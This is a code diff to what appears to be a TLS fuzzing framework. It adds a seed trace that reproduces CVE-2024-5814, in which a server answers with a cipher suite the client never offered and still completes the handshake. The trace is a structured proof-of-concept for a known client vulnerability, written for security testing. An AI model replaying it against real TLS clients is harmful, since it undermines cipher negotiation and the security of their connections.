@@ -1264,6 +1264,186 @@ pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolType
     }
 }
 
+/// https://nvd.nist.gov/vuln/detail/CVE-2024-5814
+pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let server_hello = term! {
+        fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite12,      // WRONG: AES128 (0xC02F), client only offered AES256
+            fn_compression,
+            (fn_server_extensions_make(
+                (fn_server_extensions_append(
+                    fn_server_extensions_new,
+                    (fn_renegotiation_info_server_extension((fn_payload_u8(fn_empty_bytes_vec))))
+            ))))
+        )
+    };
+
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript12,
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
+            )),
+            (@server_hello) // plaintext ServerHello
+        )
+    };
+
+    let server_certificate = term! {
+        fn_certificate(
+            (fn_append_certificate(
+                fn_new_certificates,
+                (fn_certificate_from_vec_u8(fn_alice_cert))
+            ))
+        )
+    };
+
+    let certificate_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_transcript),
+            (@server_certificate)
+        )
+    };
+
+    let server_key_exchange = term! {
+        fn_server_key_exchange(
+            (fn_sign_rsa_ecdhe_server_key_exchange(
+                fn_named_group_secp384r1,
+                ((client, 0)),
+                fn_new_random,
+                fn_alice_key
+            ))
+        )
+    };
+
+    let server_key_exchange_transcript = term! {
+      fn_append_transcript(
+            (@certificate_transcript),
+            (@server_key_exchange)
+        )
+    };
+
+    let server_hello_done_transcript = term! {
+      fn_append_transcript(
+            (@server_key_exchange_transcript),
+            (fn_server_hello_done)
+        )
+    };
+
+    let client_key_exchange_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_done_transcript),
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))])
+        )
+    };
+
+    let client_ecdh_pubkey = term! {
+        fn_decode_client_ecdh_pubkey(
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>) // ClientECDHParams
+        )
+    };
+
+    let client_finished_transcript = term! {
+        fn_append_transcript(
+            (@client_key_exchange_transcript),
+            (fn_decrypt12( // Decrypt client finished
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(None))]), //EncryptedHandshake
+                fn_new_random,
+                (@client_ecdh_pubkey),
+                fn_named_group_secp384r1,
+                fn_false,
+                fn_seq_0,
+                ((client, 0)),
+                fn_cipher_suite12
+            ))
+        )
+    };
+
+    let server_verify_data = term! {
+        fn_server_sign_transcript(
+            fn_new_random,
+            (@client_ecdh_pubkey),
+            (@client_finished_transcript),
+            fn_named_group_secp384r1,
+            ((client, 0)),
+            fn_cipher_suite12
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            client,
+            TLSDescriptorConfig {
+                tls_version: TLSVersion::Both,
+                typ: AgentType::Client,
+                cipher_string_tls13: "TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384".into(), //"ECDHE-RSA-AES256-GCM-SHA384".into(),
+                server_authentication: false,
+                ..TLSDescriptorConfig::default()
+            },
+        )],
+        steps: vec![
+            // Client Hello, Client -> Server
+            OutputAction::new_step(client),
+            // Server Hello, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello
+                }),
+            },
+            // Server Certificate, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_certificate
+                }),
+            },
+            // Server Key Exchange, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_key_exchange
+                }),
+            },
+            // Server Hello Done, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! { fn_server_hello_done }
+                }),
+            },
+            // Output messages from Client:
+            // Client Key Exchange, Client -> Server
+            // Client Change Cipher Spec, Client -> Server
+            // Client Finished, Client -> Server
+
+            // Server Change Cipher Spec, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! { fn_change_cipher_spec }
+                }),
+            },
+            // Server Finished, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt12(
+                            (fn_finished((@server_verify_data))),
+                            fn_new_random,
+                            (@client_ecdh_pubkey),
+                            fn_named_group_secp384r1,
+                            fn_false,
+                            fn_seq_0,
+                            ((client, 0)),
+                            fn_cipher_suite12
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
 #[cfg(test)]
 pub mod tests {
     use puffin::algebra::TermType;
